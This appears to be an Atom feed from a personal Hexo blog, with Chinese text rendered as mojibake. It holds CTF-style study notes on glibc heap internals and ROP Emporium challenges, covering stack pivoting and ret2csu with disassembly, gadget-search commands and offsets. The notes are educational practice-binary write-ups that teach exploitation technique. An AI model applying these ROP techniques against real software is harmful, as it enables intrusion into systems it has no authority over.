<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>FINSENTY54</title>
  
  <subtitle>å‡ å¤„æ—©èºäº‰æš–æ ‘ï¼Œè°å®¶æ–°ç‡•å•„æ˜¥æ³¥ã€‚</subtitle>
  <link href="http://finsenty54.github.io/atom.xml" rel="self"/>
  
  <link href="http://finsenty54.github.io/"/>
  <updated>2021-03-04T06:24:30.823Z</updated>
  <id>http://finsenty54.github.io/</id>
  
  <author>
    <name>finsenty54</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>heapå…¥é—¨</title>
    <link href="http://finsenty54.github.io/2021/03/04/heap%E5%85%A5%E9%97%A8/"/>
    <id>http://finsenty54.github.io/2021/03/04/heap%E5%85%A5%E9%97%A8/</id>
    <published>2021-03-04T05:57:29.000Z</published>
    <updated>2021-03-04T06:24:30.823Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å †åˆ©ç”¨Heap-Exploitation"><a href="#å †åˆ©ç”¨Heap-Exploitation" class="headerlink" title="å †åˆ©ç”¨Heap Exploitation"></a>å †åˆ©ç”¨Heap Exploitation</h1><p><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</a><br><a href="https://ctf-wiki.org/pwn/linux/glibc-heap/introduction/">https://ctf-wiki.org/pwn/linux/glibc-heap/introduction/</a></p><p>åŸºç¡€çŸ¥è¯†å­¦ä¹ ptmalloc</p><h2 id="å‘½ä»¤ï¼šï¼š"><a href="#å‘½ä»¤ï¼šï¼š" class="headerlink" title="å‘½ä»¤ï¼šï¼š"></a>å‘½ä»¤ï¼šï¼š</h2><p><code>gefâ¤  x/32gx &amp;main_arena </code></p><a id="more"></a><h2 id="ç”³è¯·ä¸é‡Šæ”¾"><a href="#ç”³è¯·ä¸é‡Šæ”¾" class="headerlink" title="ç”³è¯·ä¸é‡Šæ”¾"></a>ç”³è¯·ä¸é‡Šæ”¾</h2><p>malloc()<br>free()</p><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc()"></a>malloc()</h3><p>malloc() ä½¿ç”¨<code>brk() mmap()</code>ç”³è¯·å†…å­˜</p><h4 id="brk-sbrk"><a href="#brk-sbrk" class="headerlink" title="brk() sbrk()"></a>brk() sbrk()</h4><p>The<code>program break</code>is the<code>address</code>of the first location beyond the current end of the data region.</p><pre><code>#include &lt;unistd.h&gt;int brk(void* end_data_segment);void *sbrk(intptr_t increment);â”Œâ”€[zentreisender@parrotos]â”€[~/Documents/heap]â””â”€â”€â•¼ $./brkWelcome to sbrk example:178107Program Break Location1:0x555db6660000aProgram break Location2:0x555db6661000Program Break Location3:0x555db6660000a</code></pre><p>ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* sbrk and brk example */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">void</span> *curr_brk, *tmp_brk = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to sbrk example:%d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* sbrk(0) gives current program break location */</span></span><br><span class="line">        tmp_brk = curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program Break Location1:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* brk(addr) increments/decrements program break location */</span></span><br><span class="line">        brk(curr_brk+<span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program break Location2:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        brk(tmp_brk);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program Break Location3:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>brk å‚æ•°æ˜¯æŒ‡é’ˆï¼Œè®¾ç½®breakå€¼<br>æ‰€ä»¥å…ˆç”¨sbrk(0)è·å¾—å½“å‰breakå€¼çš„æŒ‡å‘æŒ‡é’ˆ<br>å†è®¾ç½®brk(sbrk(0)+4096)</p><h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap()"></a>mmap()</h4><p>malloc ä¼šä½¿ç”¨ mmapæ¥åˆ›å»ºç‹¬ç«‹çš„åŒ¿åæ˜ å°„æ®µã€‚åŒ¿åæ˜ å°„çš„ç›®çš„ä¸»è¦æ˜¯å¯ä»¥ç”³è¯·ä»¥0å¡«å……çš„å†…å­˜ï¼Œå¹¶ä¸”è¿™å—å†…å­˜ä»…è¢«è°ƒç”¨è¿›ç¨‹æ‰€ä½¿ç”¨ã€‚</p><pre><code>addr = mmap(NULL, (size_t)132*1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</code></pre><p>munmap()</p><pre><code>char* addraddr = (char*) malloc(1000);</code></pre><p>è™½ç„¶åªæ˜¯ç”³è¯·äº†1000ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯æˆ‘ä»¬å´å¾—åˆ°äº†0x0806c000-0x0804b000=0x21000ä¸ªå­—èŠ‚çš„å †ï¼Œint(0x21000,10)/1024=132ï¼ŒåŸæ¥è¿™132KBçš„å †ç©ºé—´å«åš<code>arena</code>ï¼Œæ­¤æ—¶å› ä¸ºæ˜¯ä¸»çº¿ç¨‹åˆ†é…çš„ï¼Œæ‰€ä»¥è¿™ä¸ªåŒºåŸŸå«åš <code>main arena</code>ï¼Œï¼ˆç§°è¿™ä¸€å—è¿ç»­çš„å†…å­˜åŒºåŸŸä¸º arenaï¼Œï¼‰ç”³è¯·çš„å†…å­˜ä¼šä¸€ç›´ä»è¿™ä¸ª arena ä¸­è·å–ï¼Œç›´åˆ°ç©ºé—´ä¸è¶³ï¼Œå½“ arena ç©ºé—´ä¸è¶³æ—¶ï¼Œå®ƒå¯ä»¥é€šè¿‡å¢åŠ <code>brk</code>çš„æ–¹å¼æ¥å¢åŠ å †çš„ç©ºé—´ã€‚</p><p>this shows heap memory is created by increasing program break location ( ie) using brk syscall</p><h3 id="free"><a href="#free" class="headerlink" title="free()"></a>free()</h3><p>Allocated memory region (of size 1000 bytes) is <code>released only to â€˜glibc mallocâ€™ library</code>,â€˜glibc mallocâ€™ doesnt get new heap memory from kernel, instead it will try to find a free block in bin. And only when no free block exists, it obtains memory from kernel.</p><p>1.æ¸…ç©ºæ­¤å †å—çš„ user data<br>2.å°†æ­¤å †å—çš„æŒ‡é’ˆå­˜å‚¨åˆ° main_arena ä¸­äº†ï¼ˆæˆ–æ˜¯ fast bin ä¸­ï¼‰</p><p>çœ‹å‡ºå®é™…çœŸçš„åˆ†é…ç»™ç¨‹åºçš„å†…å­˜ä¸º1M(b7500000-b7600000)ã€‚heap memory of size 1 MB ,è€Œä¸”ï¼Œåªæœ‰132KBçš„éƒ¨åˆ†å…·æœ‰å¯è¯»å¯å†™æƒé™ï¼Œè¿™ä¸€å—è¿ç»­çš„åŒºåŸŸæˆä¸º<code>thread arena</code>ã€‚æ˜¯ä½¿ç”¨<code>mmap()</code>åˆ†é…çš„ï¼Œè€Œä¸æ˜¯sbrk()<br>å½“ç”¨æˆ·è¯·æ±‚çš„å†…å­˜å¤§äº128KBæ—¶ï¼Œå¹¶ä¸”æ²¡æœ‰ä»»ä½•arenaæœ‰è¶³å¤Ÿçš„ç©ºé—´æ—¶ï¼Œé‚£ä¹ˆç³»ç»Ÿå°±ä¼šæ‰§è¡Œmmapå‡½æ•°æ¥åˆ†é…ç›¸åº”çš„å†…å­˜ç©ºé—´ï¼Œè€Œä¸æ˜¯sbrk()ã€‚è¿™ä¸è¿™ä¸ªè¯·æ±‚æ¥è‡ªäºä¸»çº¿ç¨‹è¿˜æ˜¯ä»çº¿ç¨‹æ— å…³ã€‚</p><p> Instead allocated memory region (of size 1000 bytes) is released to â€˜glibc mallocâ€™, which adds this freed block to its thread arenas bin.</p><h2 id="chunkç»“æ„"><a href="#chunkç»“æ„" class="headerlink" title="chunkç»“æ„"></a>chunkç»“æ„</h2><pre><code>gefâ¤  x/32gx $rax-0x100x555555559290:    0x0000000000000000    0x00000000000000210x5555555592a0:    0x0000000000000000    0x00000000000000000x5555555592b0:    0x0000000000000000    0x0000000000020d510x5555555592c0:    0x0000000000000000    0x00000000000000000x5555555592d0:    0x0000000000000000    0x00000000000000000x5555555592e0:    0x0000000000000000    0x00000000000000000x5555555592f0:    0x0000000000000000    0x00000000000000000x555555559300:    0x0000000000000000    0x00000000000000000x555555559310:    0x0000000000000000    0x00000000000000000x555555559320:    0x0000000000000000    0x0000000000000000</code></pre><p>presize 8å­—èŠ‚<br>size 8å­—èŠ‚<br>0x5555555592a0 å¼€å§‹æ˜¯user-data<br>64ä½æœ€å°åˆ†é…16Bï¼Œ32ä½æœ€å°åˆ†é…8Bï¼Œæ‰€ä»¥æ˜¯<code>16+8+8+1=21</code><br>user-data+header-len+pre_(1)=21<br><code>sizeæœ€ä½ä¸‰ä½ï¼ŒLSBè¡¨ç¤ºå‰ä¸€chunkæ˜¯å¦åˆ†é…ã€‚</code></p><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>ç»“å°¾äºarenaçš„æœ€é«˜åœ°å€å¤„<br>å †åœ°å€ä»ä½åœ°å€å‘é«˜åœ°å€å¢é•¿<br><a href="https://imgtu.com/i/6Vae81"><img src="https://s3.ax1x.com/2021/03/04/6Vae81.png" alt="6Vae81.png"></a></p><p>åœ¨ç¨‹åºåœ¨å‘å †ç®¡ç†å™¨ç”³è¯·å†…å­˜æ—¶ï¼Œæ²¡æœ‰åˆé€‚çš„å†…å­˜ç©ºé—´å¯ä»¥åˆ†é…ç»™ä»–ï¼Œæ­¤æ—¶å°±ä¼šä» top chunk ä¸Šâ€å‰ªåˆ‡â€ä¸€éƒ¨åˆ†ä½œä¸º chunk åˆ†é…ç»™ä»–</p><p>chunk()</p><h3 id="allocated-chunk"><a href="#allocated-chunk" class="headerlink" title="allocated chunk"></a>allocated chunk</h3><p>prev_size: If the <code>previous chunk is free</code>, this field contains <code>the size of previous chunk</code>. Else if previous chunk is <code>allocated</code>, this field contains<code> previous chunkâ€™s user data</code>.<br>size: This field contains the size of this allocated chunk. <code>Last 3 bits</code> of this field contains flag information.</p><pre><code>PREV_INUSE (P) â€“ This bit is set when previous chunk is allocated.IS_MMAPPED (M) â€“ This bit is set when chunk is mmapâ€™d.NON_MAIN_ARENA (N) â€“ This bit is set when this chunk belongs to a thread arena.</code></pre><p>Other fields of malloc_chunk (like fd, bk) <code>is NOT used for allocated chunk</code>. Hence in place of these fields user data is stored.<br>Â·ç”±äºå­˜å‚¨malloc_chunkä»¥åŠå¯¹é½ç›®çš„éœ€è¦ä¸€äº›é¢å¤–çš„ç©ºé—´ï¼Œå› æ­¤ç”¨æˆ·è¯·æ±‚çš„å¤§å°å°†è½¬æ¢ä¸ºå¯ç”¨å¤§å°ï¼ˆå†…éƒ¨è¡¨ç¤ºå¤§å°ï¼‰ã€‚<br>Â·è½¬æ¢çš„æ–¹å¼æ˜¯ä¸ä¼šè®¾ç½®å¯ç”¨å¤§å°çš„æœ€å3ä½ï¼Œå› æ­¤å°†å…¶ç”¨äºå­˜å‚¨æ ‡å¿—ä¿¡æ¯ã€‚<br><a href="https://imgtu.com/i/6VaHR1"><img src="https://s3.ax1x.com/2021/03/04/6VaHR1.png" alt="6VaHR1.png"></a></p><h3 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a>free chunk</h3><p>prev_size: <code>No two free chunks can be adjacent together</code>. When both the chunks are free, its <code>gets combined into one single free chunk</code>. Hence always previous chunk to this freed chunk would be allocated and therefore prev_size contains previous chunkâ€™s user data.<br><code>fd</code>: Forward pointer â€“ Points to <code>next chunk</code> in the same bin (and NOT to the next chunk present in physical memory).<br>bk: Backward pointer â€“ Points to previous chunk in the same bin (and NOT to the previous chunk present in physical memory).<br><a href="https://imgtu.com/i/6VaOsK"><img src="https://s3.ax1x.com/2021/03/04/6VaOsK.png" alt="6VaOsK.png"></a></p><h2 id="bins-åƒåœ¾æ¡¶"><a href="#bins-åƒåœ¾æ¡¶" class="headerlink" title="bins åƒåœ¾æ¡¶"></a>bins åƒåœ¾æ¡¶</h2><p>å·²ç»ç”³è¯·åˆ°çš„å†…å­˜ç©ºé—´å¤§å°è¿›è¡Œé‡Šæ”¾ï¼Œæ¥å†³å®šæ”¾å…¥å“ªç±» bins å½“ä½œå»ã€‚<br>Fast bin<br>Unsorted bin<br>Small bin<br>Large bin</p><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p><code>Chunks of size 16 to 80 bytes is called a fast chunk.</code></p><p>Number of bins â€“ 10<br>Each fast bin contains a <code>single linked list</code> (a.k.a binlist) of free chunks.<br>Fast bins contain a binlist of chunks whose sizes are 8 bytes apart. ie) First fast bin (index 0) contains binlist of chunks of size 16 bytes, second fast bin (index 1) contains binlist of chunks of size  24 bytes and so onâ€¦</p><p>During malloc initialization, maximum fast bin size is set to 64 (!80) bytes.</p><h3 id="small"><a href="#small" class="headerlink" title="small"></a>small</h3><p>When small or large chunk gets freed instead of adding them in to their respective bins, <code>its gets added into unsorted bin.</code><br>This approach gives â€˜glibc mallocâ€™ a second chance to reuse the recently freed chunks.<br>Chunk size â€“ There is no size restriction, chunks of any size belongs to this bin.</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å †åˆ©ç”¨Heap-Exploitation&quot;&gt;&lt;a href=&quot;#å †åˆ©ç”¨Heap-Exploitation&quot; class=&quot;headerlink&quot; title=&quot;å †åˆ©ç”¨Heap Exploitation&quot;&gt;&lt;/a&gt;å †åˆ©ç”¨Heap Exploitation&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/&quot;&gt;https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://ctf-wiki.org/pwn/linux/glibc-heap/introduction/&quot;&gt;https://ctf-wiki.org/pwn/linux/glibc-heap/introduction/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;åŸºç¡€çŸ¥è¯†å­¦ä¹ ptmalloc&lt;/p&gt;
&lt;h2 id=&quot;å‘½ä»¤ï¼šï¼š&quot;&gt;&lt;a href=&quot;#å‘½ä»¤ï¼šï¼š&quot; class=&quot;headerlink&quot; title=&quot;å‘½ä»¤ï¼šï¼š&quot;&gt;&lt;/a&gt;å‘½ä»¤ï¼šï¼š&lt;/h2&gt;&lt;p&gt;&lt;code&gt;gefâ¤  x/32gx &amp;amp;main_arena &lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Heap" scheme="http://finsenty54.github.io/categories/Heap/"/>
    
    
    <category term="heap" scheme="http://finsenty54.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>&lt;&lt;åŸºæœ¬ROP_ropemporium pivot + ret2csu</title>
    <link href="http://finsenty54.github.io/2021/03/02/%E5%9F%BA%E6%9C%ACROP_ropemporium_pivot_+_ret2csu/"/>
    <id>http://finsenty54.github.io/2021/03/02/%E5%9F%BA%E6%9C%ACROP_ropemporium_pivot_+_ret2csu/</id>
    <published>2021-03-02T08:49:03.000Z</published>
    <updated>2021-03-02T08:51:47.679Z</updated>
    
    <content type="html"><![CDATA[<p>ä»£ç ï¼š<a href="https://github.com/Finsenty54/attack-code/tree/master/ROPemporium">https://github.com/Finsenty54/attack-code/tree/master/ROPemporium</a></p><h2 id="å‘½ä»¤"><a href="#å‘½ä»¤" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h2><pre><code>objdump -T libpivot32.so æŸ¥çœ‹æ‰€æœ‰ç¬¦å·rabin2 -E ./libpivot.so ä¹Ÿå¯ä»¥æŸ¥çœ‹ -E              globally exportable symbolsobjdump -j .text -d ./ret2csuobjdump -x ret2csugefâ¤  search-pattern 0x4004d0 æŸ¥è¯¢å«æœ‰0x4004d0 çš„åœ°å€</code></pre><a id="more"></a><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><p><a href="https://ctf-wiki.org/pwn/linux/stackoverflow/stack-intro/#_4">https://ctf-wiki.org/pwn/linux/stackoverflow/stack-intro/#_4</a></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ32 ä½å’Œ 64 ä½ç¨‹åºæœ‰ä»¥ä¸‹ç®€å•çš„åŒºåˆ«</p><p>x86<br>å‡½æ•°å‚æ•°åœ¨å‡½æ•°è¿”å›åœ°å€çš„ä¸Šæ–¹<br>x64<br>System V AMD64 ABI (Linuxã€FreeBSDã€macOS ç­‰é‡‡ç”¨) ä¸­å‰å…­ä¸ªæ•´å‹æˆ–æŒ‡é’ˆå‚æ•°ä¾æ¬¡ä¿å­˜åœ¨ RDI, RSI, RDX, RCX, R8 å’Œ R9 å¯„å­˜å™¨ä¸­ï¼Œå¦‚æœè¿˜æœ‰æ›´å¤šçš„å‚æ•°çš„è¯æ‰ä¼šä¿å­˜åœ¨æ ˆä¸Šã€‚<br>å†…å­˜åœ°å€ä¸èƒ½å¤§äº 0x00007FFFFFFFFFFFï¼Œ6 ä¸ªå­—èŠ‚é•¿åº¦ï¼Œå¦åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p><h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><p>stack pivot<br>To â€œstack pivotâ€ just means to move the stack pointer elsewhere.</p><p>ç”¨å‘½ä»¤å¯ä»¥å‘ç°<br>10   0x0000077d 0x0000077d GLOBAL FUNC   43       foothold_function<br>18   0x00000974 0x00000974 GLOBAL FUNC   164      ret2win<br>åç§»é‡ä¸º1F7</p><p>stack smash<br>EBP-0X28<br>å¯ä»¥å†™å…¥0x38<br>40+4 æº¢å‡ºåˆ°è¿”å›åœ°å€</p><p>0x080487b4      ff7508         push dword [arg_8h]<br>ç¬¬ä¸€æ¬¡å†™å…¥çš„åœ°æ–¹æ˜¯æŒ‡é’ˆï¼Œæˆ‘çœ‹é”™äº†ï¼Œä»¥ä¸ºç›´æ¥å†™å…¥arg_8hå¤„ï¼Œè¿™é‡Œæ”¾ç¬¬äºŒæ®µè¾ƒé•¿çš„ROPé“¾</p><p>å¤§ä½“æ€è·¯ï¼šå…ˆè°ƒç”¨ä¸€æ¬¡footholdï¼Œå°†gotè¡¨é¡¹çš„å†…å®¹åŠ è½½è¿›å¯„å­˜å™¨ï¼Œè€Œä¸æ˜¯è¡¨é¡¹åœ°å€ï¼ŒåŠ ä¸Šret2winçš„åç§»ï¼Œè°ƒç”¨</p><h2 id="ret2rsu"><a href="#ret2rsu" class="headerlink" title="ret2rsu"></a>ret2rsu</h2><p>åœ¨ 64 ä½ç¨‹åºä¸­ï¼Œå‡½æ•°çš„å‰ 6 ä¸ªå‚æ•°æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’çš„ï¼Œä½†æ˜¯å¤§å¤šæ•°æ—¶å€™ï¼Œæˆ‘ä»¬å¾ˆéš¾æ‰¾åˆ°æ¯ä¸€ä¸ªå¯„å­˜å™¨å¯¹åº”çš„ gadgetsã€‚</p><h3 id="å‚æ•°"><a href="#å‚æ•°" class="headerlink" title="å‚æ•°"></a>å‚æ•°</h3><p>ret2win çš„ä¸‰ä¸ªå‚æ•°æ”¾åœ¨<br>â”‚           ; arg uint32_t arg1 @ rdi<br>â”‚           ; arg uint32_t arg2 @ rsi<br>â”‚           ; arg uint32_t arg3 @ rdx</p><h3 id="æŸ¥çœ‹-libc-csu-initä»£ç "><a href="#æŸ¥çœ‹-libc-csu-initä»£ç " class="headerlink" title="æŸ¥çœ‹__libc_csu_initä»£ç "></a>æŸ¥çœ‹__libc_csu_initä»£ç </h3><p><code>objdump -j .text -d ./ret2csu</code></p><pre><code>0000000000400640 &lt;__libc_csu_init&gt;:  400640:    41 57                    push   %r15  400642:    41 56                    push   %r14  400644:    49 89 d7                 mov    %rdx,%r15  400647:    41 55                    push   %r13  400649:    41 54                    push   %r12  40064b:    4c 8d 25 9e 07 20 00     lea    0x20079e(%rip),%r12        # 600df0 &lt;__frame_dummy_init_array_entry&gt;  400652:    55                       push   %rbp  400653:    48 8d 2d 9e 07 20 00     lea    0x20079e(%rip),%rbp        # 600df8 &lt;__do_global_dtors_aux_fini_array_entry&gt;  40065a:    53                       push   %rbx  40065b:    41 89 fd                 mov    %edi,%r13d  40065e:    49 89 f6                 mov    %rsi,%r14  400661:    4c 29 e5                 sub    %r12,%rbp  400664:    48 83 ec 08              sub    $0x8,%rsp  400668:    48 c1 fd 03              sar    $0x3,%rbp  40066c:    e8 5f fe ff ff           callq  4004d0 &lt;_init&gt;  400671:    48 85 ed                 test   %rbp,%rbp  400674:    74 20                    je     400696 &lt;__libc_csu_init+0x56&gt;  400676:    31 db                    xor    %ebx,%ebx  400678:    0f 1f 84 00 00 00 00     nopl   0x0(%rax,%rax,1)  40067f:    00   400680:    4c 89 fa                 mov    %r15,%rdx  400683:    4c 89 f6                 mov    %r14,%rsi  400686:    44 89 ef                 mov    %r13d,%edi  400689:    41 ff 14 dc              callq  *(%r12,%rbx,8)  40068d:    48 83 c3 01              add    $0x1,%rbx  400691:    48 39 dd                 cmp    %rbx,%rbp  400694:    75 ea                    jne    400680 &lt;__libc_csu_init+0x40&gt;  400696:    48 83 c4 08              add    $0x8,%rsp  40069a:    5b                       pop    %rbx  40069b:    5d                       pop    %rbp  40069c:    41 5c                    pop    %r12  40069e:    41 5d                    pop    %r13  4006a0:    41 5e                    pop    %r14  4006a2:    41 5f                    pop    %r15  4006a4:    c3                       retq     4006a5:    90                       nop  4006a6:    66 2e 0f 1f 84 00 00     nopw   %cs:0x0(%rax,%rax,1)  4006ad:    00 00 00 </code></pre><p>ç›´æ¥ç”¨ROPgadgetæœæœ‰äº›ä»£ç æœä¸åˆ°çš„</p><h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><p>è¦ä½¿ç”¨ret2csu<br>å°±éœ€è¦ç»•è¿‡call<br>è¿™æ˜¯[ ]æŒ‡é’ˆï¼Œéœ€è¦è§£å¼•ç”¨ï¼Œå³è°ƒç”¨å‡½æ•°</p><p><code>objdump -x ret2csu </code></p><pre><code> 10 .init         00000017  00000000004004d0  00000000004004d0  000004d0  2**2                  CONTENTS, ALLOC, LOAD, READONLY, CODE 11 .plt          00000030  00000000004004f0  00000000004004f0  000004f0  2**4                  CONTENTS, ALLOC, LOAD, READONLY, CODE 12 .text         00000192  0000000000400520  0000000000400520  00000520  2**4                  CONTENTS, ALLOC, LOAD, READONLY, CODE 13 .fini         00000009  00000000004006b4  00000000004006b4  000006b4  2**2                  CONTENTS, ALLOC, LOAD, READONLY, CODE</code></pre><p>å¯ä»¥çœ‹åˆ°ä¸€å…±æœ‰å››å—ä»£ç <br>é€‰æ‹©.init</p><pre><code>â”Œâ”€[zentreisender@parrotos]â”€[~/Documents/ret2csu]â””â”€â”€â•¼ $objdump -j .init -d ./ret2csu ./ret2csu:     file format elf64-x86-64Disassembly of section .init:00000000004004d0 &lt;_init&gt;:  4004d0:    48 83 ec 08              sub    $0x8,%rsp  4004d4:    48 8b 05 1d 0b 20 00     mov    0x200b1d(%rip),%rax        # 600ff8 &lt;__gmon_start__&gt;  4004db:    48 85 c0                 test   %rax,%rax  4004de:    74 02                    je     4004e2 &lt;_init+0x12&gt;  4004e0:    ff d0                    callq  *%rax  4004e2:    48 83 c4 08              add    $0x8,%rsp  4004e6:    c3                       retq   </code></pre><p>gdb-ref<br><code>gefâ¤  search-pattern 0x4004d0</code></p><pre><code>  0x600e38 - 0x600e44  â†’   &quot;\xd0\x04\x40[...]&quot; </code></pre><p>åŒæ—¶rbx=0 rbp=1</p><p>csuä»£ç ç‰‡æ®µä½¿ç”¨äº†ä¸¤æ¬¡</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä»£ç ï¼š&lt;a href=&quot;https://github.com/Finsenty54/attack-code/tree/master/ROPemporium&quot;&gt;https://github.com/Finsenty54/attack-code/tree/master/ROPemporium&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;å‘½ä»¤&quot;&gt;&lt;a href=&quot;#å‘½ä»¤&quot; class=&quot;headerlink&quot; title=&quot;å‘½ä»¤&quot;&gt;&lt;/a&gt;å‘½ä»¤&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;objdump -T libpivot32.so æŸ¥çœ‹æ‰€æœ‰ç¬¦å·
rabin2 -E ./libpivot.so ä¹Ÿå¯ä»¥æŸ¥çœ‹
 -E              globally exportable symbols
objdump -j .text -d ./ret2csu
objdump -x ret2csu
gefâ¤  search-pattern 0x4004d0 æŸ¥è¯¢å«æœ‰0x4004d0 çš„åœ°å€&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="rop_emporium" scheme="http://finsenty54.github.io/categories/rop-emporium/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>&lt;&lt;åŸºæœ¬ROP_ropemporium ç¬¬ä¸‰åˆ°å››é¢˜</title>
    <link href="http://finsenty54.github.io/2021/01/15/ROP_ropemporium_%E7%AC%AC%E4%B8%89%E5%88%B0%E5%9B%9B%E9%A2%98/"/>
    <id>http://finsenty54.github.io/2021/01/15/ROP_ropemporium_%E7%AC%AC%E4%B8%89%E5%88%B0%E5%9B%9B%E9%A2%98/</id>
    <published>2021-01-15T12:22:50.000Z</published>
    <updated>2021-01-15T12:24:37.724Z</updated>
    
    <content type="html"><![CDATA[<p>ROP Emporium write4,badchars,fluff<br>write4å’Œbadcharséƒ½è§£å‡ºæ¥äº†ï¼Œfluffæ‰¾ä¸åˆ°æœ‰ç”¨çš„gadget<br>ä»£ç ï¼š<a href="https://github.com/Finsenty54/attack-code/tree/master/ROPemporium">https://github.com/Finsenty54/attack-code/tree/master/ROPemporium</a></p><a id="more"></a><h2 id="å‘½ä»¤"><a href="#å‘½ä»¤" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h2><p>çæœæ‰¾åˆ°çš„ï¼š<br><a href="https://github.com/abatchy17/ROP-Emporium">https://github.com/abatchy17/ROP-Emporium</a></p><ol><li>Get function names: <code>nm binary | grep &#39; t &#39;</code></li><li>Get GOT entries: <code>readelf --relocs binary</code></li><li>Get PLT entries: <code>objdump -M intel -dj .plt binary</code></li><li>Get strings: <code>strings</code> binary or the much better alternative <code>rabin2 -z binary</code></li><li>Virtual address space layout: <code>vmmap </code>in PEDA after starting program, otherwise other modules arenâ€™t mapped yet.</li></ol><h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><h3 id="32ä½"><a href="#32ä½" class="headerlink" title="32ä½"></a>32ä½</h3><p>å½“å‰æŒ‡ä»¤åœ°å€<code>PC</code></p><pre><code>objdump -sobjdump -R objdump --section=.plt -d ./write432 //æŸ¥çœ‹plt</code></pre><p>./write432:     file format elf32-i386</p><pre><code>Disassembly of section .plt:080483a0 &lt;.plt&gt;: 80483a0:    ff 35 04 a0 04 08        pushl  0x804a004 80483a6:    ff 25 08 a0 04 08        jmp    *0x804a008 80483ac:    00 00                    add    %al,(%eax)    ...080483b0 &lt;pwnme@plt&gt;: 80483b0:    ff 25 0c a0 04 08        jmp    *0x804a00c 80483b6:    68 00 00 00 00           push   $0x0 80483bb:    e9 e0 ff ff ff           jmp    80483a0 &lt;.plt&gt;080483c0 &lt;__libc_start_main@plt&gt;: 80483c0:    ff 25 10 a0 04 08        jmp    *0x804a010 80483c6:    68 08 00 00 00           push   $0x8 80483cb:    e9 d0 ff ff ff           jmp    80483a0 &lt;.plt&gt;080483d0 &lt;print_file@plt&gt;: 80483d0:    ff 25 14 a0 04 08        jmp    *0x804a014 80483d6:    68 10 00 00 00           push   